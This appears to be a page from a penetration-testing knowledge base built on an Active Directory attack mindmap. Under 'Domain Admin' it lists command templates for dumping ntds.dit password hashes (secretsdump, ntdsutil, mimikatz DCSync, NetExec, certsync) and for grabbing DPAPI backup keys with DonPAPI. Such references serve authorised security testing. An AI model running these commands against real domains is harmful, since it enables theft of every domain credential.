---
title: "Domain Admin"
category: domain-admin
color: "#E51400"
tags:
  - ad-mindmap
  - domain-admin
---

# 👑 Domain Admin

> [!info] Mindmap box `Domain admin`
> Part of the [[AD Mindmap]] — Active Directory Mindmap v2025.03.

## Dump ntds.dit
➡️ [[Lateral Movement|Lateral move]] / [[Crack Hash|Crack hash]]

- `nxc smb <dcip> -u <user> -p <password> -d <domain> --ntds` [↗](https://github.com/Pennyw0rth/NetExec)
- `secretsdump.py '<domain>/<user>:<pass>'@<ip>` [↗](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- `ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q`
    - `secretsdump.py -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract` [↗](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- `msf> windows/gather/credentials/domain_hashdump` [↗](https://docs.metasploit.com/)
- `mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\administrator` [↗](https://github.com/gentilkiwi/mimikatz)
- `certsync -u <user> -p '<password>' -d <domain> -dc-ip <dc_ip> -ns <name_server>` [↗](https://github.com/zblurx/certsync)

## Grab backup Keys
➡️ [[Valid Credentials|Credentials]]

- `donpapi collect - H ':<hash>' <domain>/<user>@<ip_range> -t ALL --fetch-pvk` [↗](https://github.com/login-securite/DonPAPI)
